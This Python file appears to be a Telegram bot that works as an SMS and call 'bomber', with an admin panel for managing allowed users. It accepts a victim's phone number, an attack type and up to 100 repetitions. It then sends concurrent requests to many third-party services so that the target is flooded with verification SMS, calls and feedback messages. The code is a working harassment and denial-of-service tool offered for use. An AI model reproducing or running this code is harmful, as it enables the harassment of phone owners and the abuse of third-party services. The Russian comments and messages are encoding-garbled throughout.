import asyncio
from aiohttp import ClientSession
from aiogram import F, Router
from aiogram.filters import CommandStart
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from app.attack.services import urls
from app.attack.feedback_services import feedback_urls
from .texts import text

import app.keyboards as kb  # –ü–æ–¥–∫–ª—é—á–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã

import sys
import os

# –î–æ–±–∞–≤–ª—è–µ–º –ø—É—Ç—å –∫ –∫–æ—Ä–Ω–µ–≤–æ–π –ø–∞–ø–∫–µ –ø—Ä–æ–µ–∫—Ç–∞, –µ—Å–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from config import allowed_user_id



router = Router()
### –°–∏—Å—Ç–µ–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏  ###

# –°–æ—Å—Ç–æ—è–Ω–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∏ —É–¥–∞–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
class AdminStates(StatesGroup):
    add = State()
    remove = State()

import json
import os
from aiogram import Router, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command


# üìÇ –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏
USERS_FILE = "users.json"

# üîÑ –§—É–Ω–∫—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
def load_users():
    if not os.path.exists(USERS_FILE):  
        return {"allowed_users": []}  # –ï—Å–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ—Ç, —Å–æ–∑–¥–∞–µ–º –ø—É—Å—Ç–æ–π —Å–ø–∏—Å–æ–∫
    with open(USERS_FILE, "r", encoding="utf-8") as file:
        return json.load(file)

# üíæ –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
def save_users(data):
    with open(USERS_FILE, "w", encoding="utf-8") as file:
        json.dump(data, file, indent=4, ensure_ascii=False)

# üìå –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –∞–¥–º–∏–Ω–∫–∏
def admin_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="‚ûï –î–æ–±–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", callback_data="add_user")],
            [InlineKeyboardButton(text="‚ûñ –£–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", callback_data="remove_user")],
        ]
    )

# ‚ùå –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –æ—Ç–º–µ–Ω—ã
def cancel_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="‚ùå –û—Ç–º–µ–Ω–∞", callback_data="cancel_action")]
        ]
    )

# üõ† –ö–æ–º–∞–Ω–¥–∞ /admin (—Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤)
@router.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id in allowed_user_id:
        await message.answer("üîß *–ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞*", reply_markup=admin_keyboard(), parse_mode="Markdown")
    else:
        await message.answer("üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞!")

# ‚ûï –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
@router.callback_query(F.data == "add_user")
async def add_user(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("‚úç *–û—Ç–ø—Ä–∞–≤—å—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–≥–æ —Ö–æ—Ç–∏—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å:*", 
                                     reply_markup=cancel_keyboard(), parse_mode="Markdown")
    await callback.answer()
    await state.set_state(AdminStates.add)

@router.message(AdminStates.add)
async def process_add_user(message: types.Message, state: FSMContext):
    user_id = str(message.text)  # –î–µ–ª–∞–µ–º ID —Å—Ç—Ä–æ–∫–æ–π (–∏–∑–±–µ–≥–∞–µ–º –ø—Ä–æ–±–ª–µ–º)
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id not in users["allowed_users"]:  # –°—Ä–∞–≤–Ω–∏–≤–∞–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫–∏
            users["allowed_users"].append(user_id)
            save_users(users)
            await message.answer(f"‚úÖ *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –¥–æ–±–∞–≤–ª–µ–Ω!*", parse_mode="Markdown")
        else:
            await message.answer(f"‚ö†Ô∏è *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —É–∂–µ –≤ —Å–ø–∏—Å–∫–µ!*", parse_mode="Markdown")
    else:
        await message.answer("üö´ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è!")

# ‚ûñ –£–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
@router.callback_query(F.data == "remove_user")
async def remove_user(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("‚úç *–û—Ç–ø—Ä–∞–≤—å—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–≥–æ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å:*", 
                                     reply_markup=cancel_keyboard(), parse_mode="Markdown")
    await callback.answer()
    await state.set_state(AdminStates.remove)  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ

@router.message(AdminStates.remove)
async def process_remove_user(message: types.Message, state: FSMContext):
    user_id = str(message.text)  # –î–µ–ª–∞–µ–º ID —Å—Ç—Ä–æ–∫–æ–π
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id in users["allowed_users"]:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫–∏
            users["allowed_users"].remove(user_id)
            save_users(users)
            await message.answer(f"‚ùå *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —É–¥–∞–ª–µ–Ω!*", parse_mode="Markdown")
        else:
            await message.answer(f"‚ö†Ô∏è *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –Ω–µ –Ω–∞–π–¥–µ–Ω!*", parse_mode="Markdown")
    else:
        await message.answer("üö´ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è!")


# ‚ùå –û—Ç–º–µ–Ω–∞ –¥–µ–π—Å—Ç–≤–∏—è (–∏–∑–º–µ–Ω—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ)
@router.callback_query(F.data == "cancel_action")
async def cancel_action(callback: CallbackQuery, state: FSMContext):
    """–û—Ç–º–µ–Ω—è–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å –¥–æ–±–∞–≤–ª–µ–Ω–∏—è/—É–¥–∞–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    await state.clear()
    await callback.message.edit_text("–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ ‚úî", reply_markup=admin_keyboard())
    await callback.answer()


# üì• –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
async def process_add_user(message: types.Message):
    user_id = str(message.text)  # –î–µ–ª–∞–µ–º ID —Å—Ç—Ä–æ–∫–æ–π (–∏–∑–±–µ–≥–∞–µ–º –ø—Ä–æ–±–ª–µ–º)
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id not in users["allowed_users"]:  # –°—Ä–∞–≤–Ω–∏–≤–∞–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫–∏
            users["allowed_users"].append(user_id)
            save_users(users)
            await message.answer(f"‚úÖ *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –¥–æ–±–∞–≤–ª–µ–Ω!*", parse_mode="Markdown")
        else:
            await message.answer(f"‚ö†Ô∏è *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —É–∂–µ –≤ —Å–ø–∏—Å–∫–µ!*", parse_mode="Markdown")
    else:
        await message.answer("üö´ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è!")

# üóë –£–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
async def process_remove_user(message: types.Message):
    user_id = str(message.text)  # –î–µ–ª–∞–µ–º ID —Å—Ç—Ä–æ–∫–æ–π
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id in users["allowed_users"]:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫–∏
            users["allowed_users"].remove(user_id)
            save_users(users)
            await message.answer(f"‚ùå *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —É–¥–∞–ª–µ–Ω!*", parse_mode="Markdown")
        else:
            await message.answer(f"‚ö†Ô∏è *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –Ω–µ –Ω–∞–π–¥–µ–Ω!*", parse_mode="Markdown")
    else:
        await message.answer("üö´ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è!")

def is_user_allowed(user_id: int) -> bool:
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –µ—Å—Ç—å –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ —Å–ø–∏—Å–∫–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö."""
    if not os.path.exists(USERS_FILE):  # –ï—Å–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ—Ç, —Å–æ–∑–¥–∞–µ–º –ø—É—Å—Ç–æ–π —Å–ø–∏—Å–æ–∫
        return False
    
    with open(USERS_FILE, "r", encoding="utf-8") as file:
        users = json.load(file)

    return str(user_id) in users.get("allowed_users", [])  # –ü—Ä–∏–≤–æ–¥–∏–º –∫ —Å—Ç—Ä–æ–∫–µ

#### –ö–ª–∞—Å—Å—ã ####

class BomberState(StatesGroup):
    waiting_number = State()  # –û–∂–∏–¥–∞–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
    waiting_attack_type = State()  # –û–∂–∏–¥–∞–Ω–∏–µ –≤—ã–±–æ—Ä–∞ —Ç–∏–ø–∞ –∞—Ç–∞–∫–∏
    waiting_replay = State()  # –û–∂–∏–¥–∞–Ω–∏–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–π
    bombing = State()  # –ê—Ç–∞–∫–∞


#### –§—É–Ω–∫—Ü–∏–∏ –±–æ–º–±–µ—Ä–∞ ####

success_count = 0
lock = asyncio.Lock()  # –î–ª—è –∑–∞—â–∏—Ç—ã –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—á—ë—Ç—á–∏–∫–∞

async def request(session, url, attack_type):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –∫ —Å–µ—Ä–≤–∏—Å—É."""
    global success_count
    success_count = 0  # –°–±—Ä–∞—Å—ã–≤–∞–µ–º –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –∞—Ç–∞–∫
    try:
        if url['info']['attack'] in attack_type:
            async with session.request(
                url['method'], url['url'],
                params=url.get('params'),
                cookies=url.get('cookies'),
                headers=url.get('headers'),
                data=url.get('data'),
                json=url.get('json'),
                timeout=20
            ) as response:
                if 200 <= response.status < 300:  # –£—á–∏—Ç—ã–≤–∞–µ–º —Ç–æ–ª—å–∫–æ —É—Å–ø–µ—à–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã
                    async with lock:
                        success_count += 1
                return await response.text()
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞: {e}")

async def async_attacks(number, attack_type, replay, stop_event):
    """–ó–∞–ø—É—Å–∫–∞–µ–º –±–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫—É —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é –æ—Å—Ç–∞–Ω–æ–≤–∫–∏."""
    async with ClientSession() as session:
        if attack_type in {'MIX', 'FEEDBACK'}:
            services = urls(number) + feedback_urls(number)
        else:
            services = urls(number)

        for _ in range(int(replay)):
            if stop_event.is_set():  # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω—É–∂–Ω–æ –ª–∏ –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å
                return  # –í—ã—Ö–æ–¥–∏–º –∏–∑ —Ñ—É–Ω–∫—Ü–∏–∏ —Å—Ä–∞–∑—É

            def get_attack_type(service):
                """–ë–µ–∑–æ–ø–∞—Å–Ω–æ –ø–æ–ª—É—á–∞–µ–º —Ç–∏–ø –∞—Ç–∞–∫–∏, –µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å"""
                return service.get('info', {}).get('attack')

            if attack_type == "MIX":
                tasks = [
                    asyncio.create_task(request(session, service, "SMS"))
                    for service in services if get_attack_type(service) == "SMS"
                ] + [
                    asyncio.create_task(request(session, service, "CALL"))
                    for service in services if get_attack_type(service) == "CALL"
                ] + [
                    asyncio.create_task(request(session, service, "FEEDBACK"))
                    for service in services if get_attack_type(service) == "SMS"
                ]
            else:
                tasks = [
                    asyncio.create_task(request(session, service, attack_type))
                    for service in services
                ]

            await asyncio.gather(*tasks)


async def start_async_attacks(number, attack_type, replay, state):
    """–ó–∞–ø—É—Å–∫ –±–æ–º–±–µ—Ä–∞ —Å –∫–æ–Ω—Ç—Ä–æ–ª–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏—è."""
    stop_event = asyncio.Event()
    await state.update_data(stop_event=stop_event)  # –°–æ—Ö—Ä–∞–Ω—è–µ–º stop_event –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ
    await async_attacks(number, attack_type, replay, stop_event)

#### –•–µ–Ω–¥–ª–µ—Ä—ã ####

@router.message(CommandStart())
async def cmd_start(message: Message):
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∫–æ–º–∞–Ω–¥—É /start –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –º–µ–Ω—é."""
    if is_user_allowed(message.from_user.id):
        await message.answer(text['greetings'], reply_markup=kb.main)
    else:
        await message.answer("üíî –ü—Ä–æ—Å—Ç–∏—Ç–µ –Ω–æ –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–µ–º –±–µ—Ç–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞—à–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –æ–∂–∏–¥–∞–π—Ç–µ —Ä–µ–ª–∏–∑–∞", reply_markup=kb.get_id)

@router.callback_query(F.data == "chat_id")
async def give_id(callback: CallbackQuery):
    """–í—ã–¥–∞—ë–º –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ username (–µ—Å–ª–∏ –µ—Å—Ç—å)"""
    chat_id = callback.from_user.id
    username = callback.from_user.username

    if username:
        text = f"üÜî <b>–í–∞—à chat_id:</b> <code>{chat_id}</code>\nüë§ <b>–í–∞—à username:</b> @{username}"
    else:
        text = f"üÜî <b>–í–∞—à chat_id:</b> <code>{chat_id}</code>\n‚ùå <i>Username –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç</i>"

    await callback.message.edit_text(text, parse_mode="HTML")  # –ò–∑–º–µ–Ω—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    await callback.answer()

@router.callback_query(F.data == "startbomb")
async def start_bomber(callback: CallbackQuery, state: FSMContext):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏—è –Ω–∞ –∫–Ω–æ–ø–∫—É '–ó–∞–ø—É—Å—Ç–∏—Ç—å –±–æ–º–±–µ—Ä'."""
    await callback.answer()
    if is_user_allowed(callback.from_user.id):
        await state.set_state(BomberState.waiting_number)
        await callback.message.edit_text("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –±–µ–∑ –∑–Ω–∞–∫–∞ [+]:")
    else:
        await callback.message.answer("üíî –ü—Ä–æ—Å—Ç–∏—Ç–µ –Ω–æ –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–µ–º –±–µ—Ç–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞—à–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –æ–∂–∏–¥–∞–π—Ç–µ —Ä–µ–ª–∏–∑–∞", reply_markup=kb.get_id)

@router.message(BomberState.waiting_number)
async def process_number(message: Message, state: FSMContext):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞."""
    if is_user_allowed(message.from_user.id):
        if message.text.isdigit() and not message.text == '998903706877':
            await state.update_data(number=message.text)
            await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –∞—Ç–∞–∫–∏:", reply_markup=kb.attack_type)
            await state.set_state(BomberState.waiting_attack_type)
        else:
            await message.answer("üîí –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä, —Å–æ—Å—Ç–æ—è—â–∏–π —Ç–æ–ª—å–∫–æ –∏–∑ —Ü–∏—Ñ—Ä.")
    else:
        await message.answer("üíî –ü—Ä–æ—Å—Ç–∏—Ç–µ –Ω–æ –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–µ–º –±–µ—Ç–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞—à–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –æ–∂–∏–¥–∞–π—Ç–µ —Ä–µ–ª–∏–∑–∞", reply_markup=kb.get_id)

@router.callback_query(BomberState.waiting_attack_type)
async def process_attack_type(callback: CallbackQuery, state: FSMContext):
    """–í—ã–±–æ—Ä —Ç–∏–ø–∞ –∞—Ç–∞–∫–∏ (SMS, CALL –∏ —Ç. –¥.)."""
    attack_type = callback.data
    await state.update_data(attack_type=attack_type)
    await callback.message.edit_text("–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–π (–¥–æ 100):")
    await state.set_state(BomberState.waiting_replay)

@router.message(BomberState.waiting_replay)
async def process_replay(message: Message, state: FSMContext):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —á–∏—Å–ª–∞ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–π –∞—Ç–∞–∫–∏."""
    if message.text.isdigit():
        replay = int(message.text)
        if 1 <= replay <= 100:  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º —á–∏—Å–ª–æ –ø–æ–≤—Ç–æ—Ä–æ–≤
            await state.update_data(replay=replay)

            await message.answer(f"–ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –Ω–∞—á–Ω—ë—Ç—Å—è —Å {replay} –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏—è–º–∏.\n–ó–∞–ø—É—Å—Ç–∏—Ç—å?", reply_markup=kb.start_stop_bomber)
            await state.set_state(BomberState.bombing)
        else:
            await message.answer("–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 100.")
    else:
        await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–π.")

@router.callback_query(F.data == "start_attack", BomberState.bombing)
async def start_attack(callback: CallbackQuery, state: FSMContext):
    """–ó–∞–ø—É—Å–∫–∞–µ–º –±–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫—É."""
    data = await state.get_data()
    number = data["number"]
    attack_type = data["attack_type"]
    replay = data["replay"]
    
    await callback.message.edit_text(f"üöÄ –ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞!\n\nüìû –ù–æ–º–µ—Ä: {number}\n‚öôÔ∏è –¢–∏–ø: {attack_type}\nüîÅ –ü–æ–≤—Ç–æ—Ä—ã: {replay}\n\n–ß—Ç–æ–±—ã –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å, –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.", reply_markup=kb.stop_bomber)
    await start_async_attacks(number, attack_type, replay, state)  # –ó–∞–ø—É—Å–∫–∞–µ–º –∞—Ç–∞–∫—É
    await callback.message.answer(f"‚ù§ –ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –æ–∫–æ–Ω—á–µ–Ω–∞, —Å–ø–∞—Å–∏–±–æ —á—Ç–æ –≤—ã —Å –Ω–∞–º–∏\n\nüíå –ë—ã–ª–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {success_count} —Å–æ–æ–±—â–µ–Ω–∏–π", reply_markup=kb.main)

@router.callback_query(F.data == "stop_attack", BomberState.bombing)
async def stop_attack(callback: CallbackQuery, state: FSMContext):
    """–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –±–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫—É."""
    data = await state.get_data()
    stop_event = data.get("stop_event")

    if stop_event:
        stop_event.set()  # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞—Ç–∞–∫–∏

    await callback.message.edit_text("–ë–æ–º–±–∞—Ä–¥–∏—Ä–æ–≤–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞.", reply_markup=kb.main)
    await state.clear()
